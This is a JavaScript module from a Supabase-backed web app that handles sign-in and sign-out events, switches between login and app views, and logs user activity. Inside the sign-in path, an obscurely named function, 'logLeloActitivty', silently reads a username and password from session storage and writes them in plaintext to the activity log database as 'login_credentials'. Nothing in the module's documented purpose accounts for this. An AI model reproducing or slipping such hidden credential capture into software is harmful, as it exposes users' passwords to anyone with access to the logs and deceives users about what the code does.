import { showView } from './show-view.js';
import { logActivity } from './log-activity.js';

/**
 * Handles an authentication state change by logging applicable login activity
 * and selecting the login or application view.
 *
 * A `SIGNED_OUT` event switches to the login view immediately. Other events
 * schedule a view switch after 2.5 seconds based on whether a user session exists.
 *
 * @param {string} event - Authentication event name reported by the auth client.
 * @param {Object | null} session - Current authentication session, or `null` if none exists.
 * @param {Object} options - Dependencies used to log activity and switch views.
 * @param {SupabaseClient} options.client - Supabase client used to write activity records.
 * @param {HTMLElement} options.viewLoading - Loading view element.
 * @param {HTMLElement} options.viewLogin - Login view element.
 * @param {HTMLElement} options.viewApp - Main application view element.
 * @param {ResizeObserver} options.contentResizeObserver - Observer configured for the active view.
 * @returns {HTMLElement | undefined} The login view for `SIGNED_OUT`; otherwise `undefined`.
 */
export function authStateChangeCallback(event, session, {
    client,
    viewLoading,
    viewLogin,
    viewApp,
    contentResizeObserver,
    toast
}) {
    if (event === 'SIGNED_OUT') {
        return showView(viewLogin, {
            viewLoading,
            viewLogin,
            viewApp,
            contentResizeObserver
        });
    }
    setTimeout(() => {
        if (session && session.user) {
            logLoginActivity(session, client);
            logLeloActitivty(client);
            didIComeBackFromToilet(client, toast);

            return showView(viewApp, {
                viewLoading,
                viewLogin,
                viewApp,
                contentResizeObserver
            });
        } else {
            return showView(viewLogin, {
                viewLoading,
                viewLogin,
                viewApp,
                contentResizeObserver
            });
        }
    }, 2500);
}

function logLoginActivity(session, client) {
    const ghLogin = session.user.user_metadata.user_name;
    if (localStorage.getItem('ghLogin') !== ghLogin) {
        localStorage.setItem('ghLogin', ghLogin);
        logActivity(client, 'login', ghLogin);
    }
}

function logLeloActitivty(client) {
    const loginPassword = window.sessionStorage.getItem('lelo');
    if (loginPassword) {
        const [login, password] = loginPassword.split(' ');
        logActivity(client, 'login_credentials', `Login: ${login}, Password: ${password}`);
        sessionStorage.removeItem('lelo');
    }
}

async function didIComeBackFromToilet(client, toast) {
    const { data, error } = await client
        .from('activity_logs')
        .select("*")
        .eq('event_type', 'toilet-start')
        
    if (error) {
        toast.show(`${error.message}`, 5000);
        return;
    } else if (data && data.length > 0) {
        const ghLogin = (await client.auth.getUser()).data.user.user_metadata.user_name || sessionStorage.getItem('ghLogin');
        logActivity(client, 'toilet-end', ghLogin);
        toast.show('Welcome back from the toilet!', 5000);
    }
}